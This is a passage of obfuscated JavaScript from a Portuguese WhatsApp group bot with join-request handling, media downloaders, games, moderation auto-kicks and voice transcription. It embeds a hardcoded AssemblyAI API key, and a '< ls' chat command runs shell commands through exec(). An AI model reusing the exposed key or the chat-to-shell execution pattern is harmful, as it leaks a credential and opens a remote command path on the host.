                      title: "ping",
                      id: _0x1d93be + "ping",
                      disabled: false
                    }]
                  }, {
                    rows: [{
                      title: "dono",
                      id: _0x1d93be + "dono",
                      disabled: false
                    }]
                  }, {
                    rows: [{
                      title: "loja",
                      id: _0x1d93be + "loja",
                      disabled: false
                    }]
                  }]
                })
              }, {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Rest Api",
                  url: "${SITE_JEFF_APIS}"
                })
              }, {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "botao",
                  id: _0x1d93be + "menu"
                })
              }, {
                name: "voice_call",
                buttonParamsJson: JSON.stringify({})
              }, {
                name: "cta_reminder",
                buttonParamsJson: JSON.stringify({})
              }, {
                name: "form_message",
                buttonParamsJson: JSON.stringify({})
              }];
              const _0x2a8653 = {
                upload: _0x263319.waUploadToServer
              };
              const _0x4bd12b = {
                buttons: _0x1d871e,
                messageParamsJson: ""
              };
              const _0x56712d = {
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({
                    image: {
                      url: "https://i.imgur.com/llFdVOZ.jpeg"
                    }
                  }, _0x2a8653)),
                  hasMediaAttachment: true,
                  title: "Teste do botao"
                }),
                nativeFlowMessage: _0x4bd12b
              };
              const _0xb3ba99 = {
                cards: [_0x56712d],
                messageVersion: 1
              };
              let _0x46dc85 = generateWAMessageFromContent(_0x4f1071, {
                interactiveMessage: {
                  contextInfo: {
                    participant: _0x32e455,
                    mentionedJid: [_0x32e455, "553299240466@s.whatsapp.net"],
                    quotedMessage: _0x302296.message
                  },
                  carouselMessage: _0xb3ba99
                }
              }, {});
              _0x263319.relayMessage(_0x4f1071, _0x46dc85.message, {
                messageId: _0x46dc85.key.id
              });
              break;
            case "versolicitacoes":
              {
                if (!_0x150e9e && !_0x2a5ff3) {
                  return _0x403602(mess.onlyAdmins());
                }
                if (!_0x5550bd) {
                  return _0x403602(enviar.msg.Badmin);
                }
                try {
                  const _0x3e1461 = await _0x263319.groupRequestParticipantsList(_0x4f1071);
                  let _0x14027e = _0x3e1461.length;
                  if (_0x14027e === 0) {
                    return _0x403602("*Não há nenhuma solicitação pendente no grupo 💁‍♂️*");
                  } else {
                    return _0x403602("Existem *" + _0x14027e + "* solicitação(ões) pendente(s) no grupo!");
                  }
                } catch (_0x1ad090) {
                  console.error("Erro ao verificar as solicitações:", _0x1ad090);
                  _0x403602("*Ocorreu um erro ao tentar verificar as solicitações. Por favor, tente novamente mais tarde.*");
                }
              }
              break;
            case "aceitar":
            case "✅":
              {
                if (!_0x150e9e && !_0x2a5ff3) {
                  return _0x403602(mess.onlyAdmins());
                }
                if (!_0x5550bd) {
                  return _0x403602(enviar.msg.Badmin);
                }
                const _0x4c49da = await _0x263319.groupRequestParticipantsList(_0x4f1071);
                let _0x1deb32 = _0x4c49da.length;
                if (_0x4c49da == 0) {
                  return _0x403602("*TEM SOLICITAÇÃO NAO MANO*");
                }
                for (var _0xc3d45a of _0x4c49da) {
                  _0xc3d45a.jid.replace += "Sujeito: @" + _0xc3d45a.jid.replace("@s.whatsapp.net", "") + "\nNúmero solicitante: " + _0xc3d45a.jid.replace("@s.whatsapp.net", "") + "\n";
                  await _0x263319.groupRequestParticipantsUpdate(_0x4f1071, [_0xc3d45a.jid.replace("@s.whatsapp.net", "") + "@s.whatsapp.net"], "approve");
                }
                _0x403602("*SOLICITAÇÕES ACEITAS COM SUCESSO ✓*");
              }
              break;
            case "recusar":
            case "❌":
              {
                if (!_0x150e9e && !_0x2a5ff3) {
                  return _0x403602(mess.onlyAdmins());
                }
                if (!_0x5550bd) {
                  return _0x403602(enviar.msg.Badmin);
                }
                const _0x3380c7 = await _0x263319.groupRequestParticipantsList(_0x4f1071);
                let _0x9cf239 = _0x3380c7.length;
                if (_0x9cf239 == 0) {
                  return _0x403602("*TEM SOLICITAÇÃO NAO PAE*");
                }
                for (let _0x2c113d of _0x3380c7) {
                  let _0x2566b5 = _0x2c113d.jid;
                  await _0x263319.groupRequestParticipantsUpdate(_0x4f1071, [_0x2566b5], "reject");
                }
                _0x403602("*SOLICITAÇÕES RECUSADAS!*");
              }
              break;
            case "topcase":
              {
                _0x403602(_0x532a11());
                break;
              }
            case "gdrive":
            case "googledrive":
              if (!_0x1d6557.includes("drive.google.com")) {
                return _0x403602("Faltando o link do Google Drive para download do arquivo, cade?");
              }
              _0x1b86ad(_0x4f1071, "⏳");
              let _0x5c68f3;
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/dl/gdrive?url=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                if (!ABC.resultado || !ABC.resultado.downloadUrl || !ABC.resultado.fileName) {
                  return _0x403602("Erro ao obter o link de download. Verifique o link ou tente novamente.");
                }
                _0x403602("Aguarde, estou baixando o arquivo. Pode demorar até *2min* para enviar!");
                _0x1b86ad(_0x4f1071, "📥");
                const _0x31120a = "./Media";
                if (!fs.existsSync(_0x31120a)) {
                  fs.mkdirSync(_0x31120a);
                }
                _0x5c68f3 = _0x31120a + "/" + ABC.resultado.fileName;
                const _0x463fa0 = await fetch(ABC.resultado.downloadUrl);
                if (!_0x463fa0.ok) {
                  return _0x403602("Erro ao baixar o arquivo. Verifique o link ou tente novamente.");
                }
                const _0x837083 = await _0x463fa0.arrayBuffer();
                const _0x40785c = Buffer.from(_0x837083);
                fs.writeFileSync(_0x5c68f3, _0x40785c);
                const _0x31711c = {
                  url: _0x5c68f3
                };
                const _0x4a8ed8 = {
                  document: _0x31711c,
                  mimetype: ABC.resultado.mimetype || "application/octet-stream",
                  fileName: ABC.resultado.fileName
                };
                const _0x2fd95d = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4a8ed8, _0x2fd95d);
                _0x1b86ad(_0x4f1071, "✅");
              } catch (_0x18aade) {
                console.error("Erro no processo:", _0x18aade);
                _0x403602("Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.");
              } finally {
                if (_0x5c68f3 && fs.existsSync(_0x5c68f3)) {
                  fs.unlinkSync(_0x5c68f3);
                }
              }
              break;
            case "update":
            case "checkupdate":
            case "atualizar":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              function _0x4233ba() {
                const _0x3578a1 = "./index.js";
                const _0x3898d5 = fs.readFileSync(_0x3578a1, "utf8");
                const _0x156a2a = /\b0x[0-9a-fA-F]{1,}\b/.test(_0x3898d5);
                if (_0x156a2a) {
                  return true;
                }
                return false;
              }
              if (_0x4233ba()) {
                _0x2f37ad(_0x4f1071, _0x302296);
              } else {
                return _0x403602("☝️🤓 *Esta versão do X-Bot está descriptografada e não pode ser atualizada com comando, apenas com o meu criador.*\n\n*CRIADOR:* https://wa.me/553299240466");
              }
              break;
            default:
              if (_0x2e320b.includes("< ls")) {
                if (!_0x2a5ff3 && !_0x35021e) {
                  return;
                }
                exec("ls -p | awk '{print ($0 ~ /\\//) ? \"📁 \" substr($0, 1, length($0)-1) : \"📄 \" $0}'", (_0xbfe023, _0x48ab09) => {
                  if (_0xbfe023) {
                    return _0x403602("" + _0xbfe023);
                  }
                  if (_0x48ab09) {
                    _0x403602(_0x48ab09);
                  }
                });
              }
              if (_0xd20756 && _0x5550bd && !_0x150e9e && !_0x35021e) {
                if (_0x399715 || _0x51863c || _0x169982) {
                  if (_0x51a818 === "contactMessage" || _0x51a818 === "contactsArrayMessage" || _0x51a818 === "locationMessage" || _0x51a818 === "productMessage") {
                    const _0x1b799a = {
                      quoted: _0x302296
                    };
                    if (_0x150e9e) {
                      return _0x263319.sendMessage(_0x4f1071, {
                        text: "Uma dessas opções estão ativada, mas por você ser ADM, não será removido(a) _(ANTI CONTATO - ANTI CATALOGO - ANTI LOCALIZAÇÃO)"
                      }, _0x1b799a);
                    }
                    if (_0x326231) {
                      setTimeout(() => {
                        _0x263319.sendMessage(_0x4f1071, {
                          delete: {
                            remoteJid: _0x4f1071,
                            fromMe: false,
                            id: _0x302296.key.id,
                            participant: _0x32e455
                          }
                        });
                      }, 500);
                    }
                    if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
                      return;
                    }
                    _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
                    clear = "🗑" + "\n".repeat(255) + "🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅";
                    const _0x412373 = {
                      forwardingScore: 500,
                      isForwarded: true
                    };
                    const _0x3805d9 = {
                      text: clear,
                      contextInfo: _0x412373
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x3805d9);
                    const _0x52301d = {
                      text: "reporte aos adm o ocorrido ",
                      mentions: _0x2aa963
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x52301d);
                  }
                }
              }
              if (akinator && Array.isArray(akinator) && akinator.length > 0 && JSON.stringify(akinator).includes(_0x4f1071)) {
                const _0x59745a = akinator.findIndex(_0x493883 => _0x493883.id === _0x4f1071 && _0x493883.jogador === _0x32e455);
                if (_0x59745a !== -1) {
                  const _0x53a0fa = akinator[_0x59745a];
                  if (_0x53a0fa.termino > 0) {
                    if (["sim", "s"].includes(_0xf87dd3.toLowerCase())) {
                      akinator.splice(_0x59745a, 1);
                      fs.writeFileSync(akinatorjson, JSON.stringify(akinator, null, 2));
                      _0x403602("*- Akinator🧙‍♂️:* Outra vitória para mim!.");
                    } else if (["nao", "n"].includes(_0xf87dd3.toLowerCase().replace("ã", "a"))) {
                      akinator.splice(_0x59745a, 1);
                      fs.writeFileSync(akinatorjson, JSON.stringify(akinator, null, 2));
                      _0x403602("*⏤͟͟͞͞ ꦿAKINATOR* 🧙🏼‍♂️\n* Na próxima eu acertarei!.");
                    }
                  } else if (aki.guess !== undefined) {
                    const _0x3247a4 = aki.guess;
                    _0x53a0fa.termino += 1;
                    fs.writeFileSync(akinatorjson, JSON.stringify(akinator, null, 2));
                    const _0x423b35 = {
                      url: _0x3247a4.photo
                    };
                    const _0x2dea34 = {
                      image: _0x423b35,
                      caption: "*⏤͟͟͞͞ ꦿAKINATOR* 🧙🏼‍♂️ Teu personagem é: *" + _0x3247a4.name_proposition + "*\n*—*\n*• Sobre:* " + _0x3247a4.description_proposition + "\n\n*- Esse é seu personagem?*\n*• Responda com:* *\"sim\"* ou *\"não\"* _(Sem aspas.)_"
                    };
                    const _0x232833 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x2dea34, _0x232833);
                  } else {
                    const _0x2d3526 = Math.min(aki.progress, 100);
                    const _0x35e20c = Math.min(Math.floor(_0x2d3526 / 100 * 10), 10);
                    const _0x2ac191 = "[" + "█".repeat(_0x35e20c).padEnd(10, "░") + "]";
                    const _0x2eaf86 = "*『 " + _0x2d3526.toFixed(1) + "%』 " + _0x2ac191 + "*";
                    const _0x20d6b9 = akinator.find(_0x4bdcbc => _0x4bdcbc.id === _0x4f1071 && _0x4bdcbc.jogador === _0x32e455);
                    if (_0x20d6b9 && _0x20d6b9.termino <= 0 && Number(_0x20d6b9.dia) === Number(moment.tz("America/Sao_Paulo").format("DD"))) {
                      if (["sim", "s"].includes(_0xf87dd3.toLowerCase())) {
                        await aki.step("0");
                      }
                      if (["nao", "n"].includes(_0xf87dd3.toLowerCase().replace("ã", "a"))) {
                        await aki.step("1");
                      }
                      if (["nao sei", "n sei"].includes(_0xf87dd3.toLowerCase().replace("ã", "a"))) {
                        await aki.step("2");
                      }
                      if (["provavelmente", "provavelmente sim", "provavelmente s"].includes(_0xf87dd3.toLowerCase())) {
                        await aki.step("3");
                      }
                      if (["provavelmente nao", "provavelmente n"].includes(_0xf87dd3.toLowerCase().replace("ã", "a"))) {
                        await aki.step("4");
                      }
                      _0x403602("*⏤͟͟͞͞ ꦿAKINATOR* 🧙🏼‍♂️\n                    \n🔮⃤" + aki.question + "\n\n" + _0x2eaf86);
                    }
                  }
                }
              }
              async function _0x257d76() {
                const _0x4179db = require("moment-timezone");
                if (casamento1.length !== 0) {
                  const _0x16e966 = Number(_0x4179db.tz("America/Sao_Paulo").format("mm"));
                  let _0x5d09d7 = false;
                  for (const _0x142e63 of casamento1) {
                    if (_0x142e63.contS < 1440 && _0x142e63.casados === true && _0x142e63.contM !== _0x16e966) {
                      _0x142e63.contS += 1;
                      _0x142e63.contM = _0x16e966;
                      _0x5d09d7 = true;
                    }
                  }
                  if (_0x5d09d7) {
                    try {
                      await fs.writeFile("./DADOS/casamento/ccasamento1.json", JSON.stringify(casamento1, null, 2));
                    } catch (_0x380339) {
                      console.error("Erro ao escrever no arquivo", _0x380339);
                    }
                  }
                }
              }
              _0x257d76();
              async function _0x3a993c() {
                if (casamento1.length != 0) {
                  for (x of casamento1) {
                    if (x.contD2 != Number(moment.tz("America/Sao_Paulo").format("DD")) && Number(moment.tz("America/Sao_Paulo").format("HH")) >= x.hora && x.contD1 < 1 && x.casados == true) {
                      x.contD1 += 1;
                      x.contD2 = Number(moment.tz("America/Sao_Paulo").format("DD"));
                      fs.writeFileSync("./DADOS/casamento/ccasamento1.json", JSON.stringify(casamento1, null, 2));
                    }
                  }
                }
              }
              _0x3a993c();
              async function _0x40a537() {
                if (casamento1.length != 0) {
                  for (x of casamento1) {
                    if (x.contD2 != Number(moment.tz("America/Sao_Paulo").format("DD")) && x.contD1 >= 1 && x.casados == true) {
                      x.contD1 += 1;
                      x.contD2 = Number(moment.tz("America/Sao_Paulo").format("DD"));
                      fs.writeFileSync("./DADOS/casamento/ccasamento1.json", JSON.stringify(casamento1, null, 2));
                    }
                  }
                }
              }
              _0x40a537();
              async function _0x38ac3d() {
                const _0xbb764a = moment.tz("America/Sao_Paulo");
                const _0x613330 = _0xbb764a.format("DD");
                const _0x31bd9f = _0xbb764a.format("MM");
                if (casamento1.length != 0) {
                  for (const _0x2eae28 of casamento1) {
                    if (_0x2eae28.dia == Number(_0x613330) && _0x2eae28.contM2 != Number(_0x31bd9f) && _0x2eae28.casados == true) {
                      if (_0x2eae28.contA1 <= 0 && _0x2eae28.contM1 < 11) {
                        const _0x5a32d0 = _0x2eae28.contM1 + 1;
                        _0x263319.sendMessage(_0x2eae28.usu1, {
                          text: "🎉 Felicidades, hoje é um dia muito especial para você... Porque hoje você comemora " + _0x5a32d0 + " m" + (_0x5a32d0 > 1 ? "eses" : "ês") + " de matrimônio com o/a @" + _0x2eae28.usu2,
                          mentions: [_0x2eae28.usu2 + "@s.whatsapp.net"]
                        });
                        _0x2eae28.contM2 = Number(_0x31bd9f);
                        fs.writeFileSync("./DADOS/casamento/ccasamento1.json", JSON.stringify(casamento1, null, 2));
                      }
                    }
                  }
                }
              }
              async function _0x4f4f59() {
                const _0x29f4d2 = moment.tz("America/Sao_Paulo");
                const _0x2d8d9e = _0x29f4d2.format("DD");
                const _0x4f2e99 = _0x29f4d2.format("MM");
                const _0x102d73 = _0x29f4d2.format("YY");
                if (casamento1.length != 0) {
                  for (const _0x3e65f8 of casamento1) {
                    if (_0x3e65f8.dia == Number(_0x2d8d9e) && _0x3e65f8.mês == Number(_0x4f2e99) && _0x3e65f8.contA2 != Number(_0x102d73) && _0x3e65f8.contM1 >= 12 && _0x3e65f8.casados == true) {
                      _0x263319.sendMessage(_0x3e65f8.usu1, {
                        text: "😍🎉 Parabéns, parece que você e sua dupla estão completando " + _0x3e65f8.contA1 + " ano" + (_0x3e65f8.contA1 > 1 ? "s" : "") + " de matrimônio 💖"
                      });
                      _0x3e65f8.contA2 = Number(_0x102d73);
                      fs.writeFileSync("./DADOS/casamento/ccasamento1.json", JSON.stringify(casamento1, null, 2));
                      ;
                    }
                  }
                }
              }
              _0x4f4f59();
              if (_0x3ad850.toLowerCase() === "s" || _0x3ad850.toLowerCase() === "sim") {
                if (JSON.stringify(casamento2).includes(_0x32e455) && casamento2[casamento2.map(_0x1ff323 => _0x1ff323.id).indexOf(_0x32e455)].idgp == _0x4f1071 && _0xd20756) {
                  hc = moment.tz("America/Sao_Paulo").format("HH");
                  mc = moment.tz("America/Sao_Paulo").format("mm");
                  sc = moment.tz("America/Sao_Paulo").format("ss");
                  _0x3c7ea4 = moment.tz("America/Sao_Paulo").format("DD");
                  mmc = moment.tz("America/Sao_Paulo").format("MM");
                  ac = moment.tz("America/Sao_Paulo").format("YY");
                  C14 = casamento2.map(_0x420ce1 => _0x420ce1.id).indexOf(_0x32e455);
                  C12 = casamento1.map(_0x5be0b4 => _0x5be0b4.usu1).indexOf(casamento2[C14].pedido + "@s.whatsapp.net");
                  casamento1[C12].casados = true;
                  casamento1[C12].contS = 0;
                  casamento1[C12].contM = Number(mc);
                  casamento1[C12].hora = Number(hc);
                  casamento1[C12].minuto = Number(mc);
                  casamento1[C12].segundo = Number(sc);
                  casamento1[C12].dia = Number(_0x3c7ea4);
                  casamento1[C12].contD1 = 0;
                  casamento1[C12].contD2 = Number(_0x3c7ea4);
                  casamento1[C12].mês = Number(mmc);
                  casamento1[C12].contM1 = 0;
                  casamento1[C12].contM2 = Number(mmc);
                  casamento1[C12].ano = Number(ac);
                  casamento1[C12].contA1 = 0;
                  casamento1[C12].contA2 = Number(ac);
                  fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                  casamento1.push({
                    usu1: _0x32e455,
                    usu2: casamento2[C14].pedido,
                    casados: true,
                    idgp: _0x4f1071,
                    contS: 0,
                    contM: Number(mc),
                    hora: Number(hc),
                    minuto: Number(mc),
                    segundo: Number(sc),
                    dia: Number(_0x3c7ea4),
                    contD1: 0,
                    contD2: Number(_0x3c7ea4),
                    mês: Number(mmc),
                    contM1: 0,
                    contM2: Number(mmc),
                    ano: Number(ac),
                    contA1: 0,
                    contA2: Number(ac)
                  });
                  fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                  casamento2.splice(C14, 1);
                  fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2));
                  _0x5b6fe5("Felicitações @" + casamento1[C12].usu1.split("@")[0] + ", parece que o/a @" + _0x32e455.split("@")[0] + " aceitou o seu pedido de casamento...\nSeu matrimônio pode ser consultado em " + _0x1d93be + "minhadupla");
                }
              }
              if (_0x3ad850.toLowerCase() === "n" || _0x3ad850.toLowerCase().replace("ã", "a") === "nao") {
                if (JSON.stringify(casamento2).includes(_0x32e455) && casamento2[casamento2.map(_0x48e814 => _0x48e814.id).indexOf(_0x32e455)].idgp == _0x4f1071 && _0xd20756) {
                  C14 = casamento2.map(_0x2b1ffa => _0x2b1ffa.id).indexOf(_0x32e455);
                  C12 = casamento1.map(_0x14f2e1 => _0x14f2e1.usu1).indexOf(casamento2[C14].pedido + "@s.whatsapp.net");
                  _0x5b6fe5("Sinto muito @" + casamento1[C12].usu1.split("@")[0] + ", parece que o/a @" + _0x32e455.split("@")[0] + " não aceitou o seu pedido de casamento...");
                  casamento1.splice(C12, 1);
                  fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                  casamento2.splice(C14, 1);
                  fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2));
                }
              }
              if (_0xd20756 && _0x74ce95 && !_0x2a5ff3 && !_0x38b1b5 && !_0x35021e && _0x5550bd && !_0x150e9e && !_0x35021e && !_0x3663a1) {
                if (_0x1466ec == null) {
                  var _0x214c6e = limitefll.limitefl;
                } else {
                  var _0x214c6e = _0x1466ec;
                }
                if (_0xf87dd3.length >= _0x214c6e) {
                  setTimeout(() => {
                    return _0x403602("Muitas Caracteres enviadas, isto é contra as normas do grupo, por precaução, eu irei remover.");
                    console.log(colors.red("Deram Spam de caracteres.."));
                  }, 100);
                  setTimeout(async () => {
                    if (_0x326231) {
                      setTimeout(() => {
                        _0x263319.sendMessage(_0x4f1071, {
                          delete: {
                            remoteJid: _0x4f1071,
                            fromMe: false,
                            id: _0x302296.key.id,
                            participant: _0x32e455
                          }
                        });
                      }, 500);
                    }
                    if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
                      return;
                    }
                    _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
                  }, 1000);
                }
              }
              switch (_0x39dad7) {}
              const _0x1df437 = async (_0x32c3f1, _0x284b8f, _0x2dee4d, _0x57c4a8, _0x51aaaf, _0x30bd81) => {
                bla = [_0x284b8f, _0x2dee4d, _0x57c4a8, _0x51aaaf, _0x30bd81];
                for (_0xc3d45a of bla) {
                  if (_0xc3d45a == undefined) {
                    return;
                  }
                  if (_0x3381b5.includes(_0xc3d45a)) {
                    const _0x286e1e = {
                      url: _0x32c3f1
                    };
                    const _0xeb3608 = {
                      audio: _0x286e1e,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    _0x263319.sendMessage(_0x4f1071, _0xeb3608);
                  }
                }
              };
              const _0x57caf7 = async (_0x5964df, _0x149f44, _0x34dcb9, _0x56d064, _0x18cfc, _0x46570b) => {
                let _0x4b87fd = [_0x149f44, _0x34dcb9, _0x56d064, _0x18cfc, _0x46570b];
                for (let _0x151511 of _0x4b87fd) {
                  if (_0x151511 == undefined) {
                    return;
                  }
                  if (_0xf87dd3.match(new RegExp(_0x151511, "i"))) {
                    const _0x28208f = {
                      url: _0x5964df
                    };
                    const _0x25c05b = {
                      audio: _0x28208f,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    const _0x1a70aa = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x25c05b, _0x1a70aa);
                    break;
                  }
                }
              };
              const _0x19f990 = async (_0x523d35, _0x3f9d28, _0x50ab3b, _0x1dcf2d, _0x5d4ae7, _0x4fe5dd) => {
                bla = [_0x3f9d28, _0x50ab3b, _0x1dcf2d, _0x5d4ae7, _0x4fe5dd];
                for (_0xc3d45a of bla) {
                  if (_0xc3d45a == undefined) {
                    return;
                  }
                  if (_0x3381b5.includes(_0xc3d45a)) {
                    const _0x32b959 = {
                      url: _0x523d35
                    };
                    const _0x29e12d = {
                      audio: _0x32b959,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x29e12d);
                  }
                }
              };
              const _0x4f52eb = async (_0x5dc140, _0x24b812, _0x417b1a, _0x632597, _0x46ed4e, _0x13a5fd) => {
                bla = [_0x24b812, _0x417b1a, _0x632597, _0x46ed4e, _0x13a5fd];
                for (_0xc3d45a of bla) {
                  if (_0xc3d45a == undefined) {
                    return;
                  }
                  if (_0x3381b5.includes(_0xc3d45a)) {
                    const _0xa9871c = {
                      text: _0x5dc140
                    };
                    _0x263319.sendMessage(_0x4f1071, _0xa9871c);
                  }
                }
              };
              const _0x34a9ae = async (_0x6eb4fd, _0xd84562, _0x256282, _0x6c777c, _0x5884fb, _0x983abe, _0xec3f99) => {
                bla = [_0x256282, _0x6c777c, _0x5884fb, _0x983abe, _0xec3f99];
                for (_0xc3d45a of bla) {
                  if (_0xc3d45a == undefined) {
                    return;
                  }
                  if (_0x3ad850.includes(_0xc3d45a)) {
                    var _0x5a96e3 = require("./armor/funcoes/gtts")(_0x6eb4fd);
                    ranm = getRandom(".mp3");
                    rano = getRandom(".ogg");
                    _0x5a96e3.save(ranm, _0xd84562, function () {
                      exec("ffmpeg -i " + ranm + " -ar 48000 -vn -c:a libopus " + rano, _0x5cd74a => {
                        DLT_FL(ranm);
                        const _0x24adff = fs.readFileSync(rano);
                        const _0x1ee877 = {
                          audio: _0x24adff,
                          ptt: true
                        };
                        const _0x45c90c = {
                          quoted: _0x302296
                        };
                        _0x263319.sendMessage(_0x4f1071, _0x1ee877, _0x45c90c);
                        DLT_FL(rano);
                      });
                    });
                  }
                }
              };
              var _0x19a9b2 = momento.tz("America/Sao_Paulo").format("HH:mm:ss");
              _0x34a9ae("pt", "São " + _0x19a9b2 + " da " + _0x6965b0.split(" ")[1], "que horas sao?");
              _0x4f52eb(_0x1d93be, "prefixo");
              if (_0x2e320b.includes("@553299240466")) {
                const _0x24371a = {
                  text: "🧙‍♂️",
                  key: _0x302296.key
                };
                const _0x2875bc = {
                  react: _0x24371a
                };
                const _0xb04eb4 = {
                  quoted: _0xa6b34
                };
                _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x2875bc, _0xb04eb4);
              }
              if (_0xf87dd3.match("criador") || _0xf87dd3.match("Jefferson") || _0xf87dd3.match("jefferson") || _0xf87dd3.match("jeff") || _0xf87dd3.match("Jeff")) {
                const _0x4ff9cb = {
                  text: "🧙‍♂️",
                  key: _0x302296.key
                };
                const _0x2d7ffc = {
                  react: _0x4ff9cb
                };
                const _0x431c91 = {
                  quoted: _0xa6b34
                };
                _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x2d7ffc, _0x431c91);
              }
              if (_0x48c5d7) {
                try {
                  let _0x142a78;
                  if (_0x51a818 === "audioMessage") {
                    _0x142a78 = await getFileBuffer(_0x302296.message.audioMessage, "audio");
                    fs.writeFileSync("./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3", _0x142a78);
                  } else if (_0x51a818 === "videoMessage") {
                    let _0x513e19 = await getFileBuffer(_0x302296.message.videoMessage, "video");
                    const _0xdfb5f8 = "./Media/Videos/totext-" + _0x32e455 + ".mp4";
                    const _0x2a3f18 = "./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3";
                    fs.writeFileSync(_0xdfb5f8, _0x513e19);
                    await new Promise((_0x13bac2, _0x455ceb) => {
                      ffmpeg(_0xdfb5f8).output(_0x2a3f18).audioCodec("libmp3lame").on("end", _0x13bac2).on("error", _0x455ceb).run();
                    });
                  }
                  const _0x413036 = new assemblyAI({
                    apiKey: "4af2d448692e4f2985dedfc7aa652c6c"
                  });
                  const _0x3e59ef = {
                    audio_url: "./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3",
                    language_code: "pt"
                  };
                  const _0x439200 = await _0x413036.transcripts.create(_0x3e59ef);
                  if (_0x439200.status === "error") {
                    console.error("Erro na transcrição:", _0x439200.error);
                    return;
                  }
                  _0x403602("📝 " + _0x55a6ac + " Falou: \n\n" + _0x439200.text);
                  DLT_FL("./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3");
                  if (_0x51a818 === "videoMessage") {
                    DLT_FL("./Media/Videos/totext-" + _0x32e455 + ".mp4");
                  }
                } catch (_0x5e8caa) {}
              }
              if (_0x340531) {
                if (_0x2e320b && _0x2e320b === "https://vm.tiktok.com/" || _0x2e320b.startsWith("https://vm.tiktok.com/") || _0x2e320b.startsWith("https://www.tiktok.com/")) {
                  const _0x3e6a16 = _0x2e320b.match(/(https?:\/\/[^\s]+)/g);
                  if (_0x3e6a16 && _0x3e6a16[0].includes("tiktok.com")) {
                    const _0x58a5be = {
                      text: "⏳",
                      key: _0x302296.key
                    };
                    const _0x391e97 = {
                      react: _0x58a5be
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x391e97);
                    try {
                      const _0xdc5649 = await fetchJson(SITE_JEFF_APIS + "/download/tiktok2?url=" + _0x3e6a16[0] + "&apikey=" + _0x512d5e);
                      if (_0xdc5649.resultado && _0xdc5649.resultado.videoOriginal) {
                        const _0x25374a = await getBuffer(_0xdc5649.resultado.videoOriginal);
                        const _0x3ffddc = {
                          text: "✅",
                          key: _0x302296.key
                        };
                        const _0x436774 = {
                          react: _0x3ffddc
                        };
                        _0x263319.sendMessage(_0x4f1071, _0x436774);
                        const _0x2bb66c = {
                          video: _0x25374a,
                          caption: "Olá *" + _0x55a6ac + "*, aqui está o vídeo."
                        };
                        const _0x55274f = {
                          quoted: _0x302296
                        };
                        await _0x263319.sendMessage(_0x4f1071, _0x2bb66c, _0x55274f).catch(_0x521669 => {
                          _0x403602("Ocorreu um erro ao processar o vídeo.");
                        });
                      } else {
                        _0x403602("Não foi possível obter o vídeo do TikTok.");
                      }
                    } catch (_0x270900) {
                      _0x403602("Ocorreu um erro ao buscar o vídeo do TikTok.");
                    }
                  } else {}
                } else {
                  return;
                }
                if (_0x3ad850.includes("https://youtu.be/") || _0x3ad850.includes("https://youtube.com/")) {
                  const _0x571aeb = _0x2e320b.match(/https?:\/\/[^\s]+/g)?.[0];
                  if (_0x571aeb.includes("youtu.be")) {
                    const _0x5f52fb = {
                      text: "⏳",
                      key: _0x302296.key
                    };
                    const _0x477145 = {
                      react: _0x5f52fb
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x477145);
                    try {
                      const {
                        video: _0x12ffbb
                      } = await fetchJson(SITE_JEFF_APIS + "/api/dl/ytvideo2?url=" + _0x571aeb + "&apikey=" + _0x512d5e);
                      if (_0x12ffbb) {
                        const _0x5890d1 = {
                          text: "✅",
                          key: _0x302296.key
                        };
                        const _0x2a5500 = {
                          react: _0x5890d1
                        };
                        _0x263319.sendMessage(_0x4f1071, _0x2a5500);
                        const _0x92b750 = {
                          video: _0x12ffbb,
                          caption: ""
                        };
                        const _0x2cfc8b = {
                          quoted: _0x302296
                        };
                        await _0x263319.sendMessage(_0x4f1071, _0x92b750, _0x2cfc8b);
                      } else {
                        _0x403602("Não foi possível obter o vídeo do YouTube.");
                      }
                    } catch {
                      _0x403602("Ocorreu um erro ao buscar o vídeo do YouTube.");
                    }
                  }
                }
                if (_0x2e320b && _0x2e320b === "https://www.instagram.com/reel/" || _0x2e320b.startsWith("https://www.instagram.com/") || _0x2e320b.startsWith("https://www.instagram.com/reel/")) {
                  const _0x4276a7 = _0x2e320b.match(/https?:\/\/[^\s]+/g)?.[0];
                  if (_0x4276a7.includes("instagram.com")) {
                    const _0x2c8c02 = {
                      text: "⏳",
                      key: _0x302296.key
                    };
                    const _0x425836 = {
                      react: _0x2c8c02
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x425836);
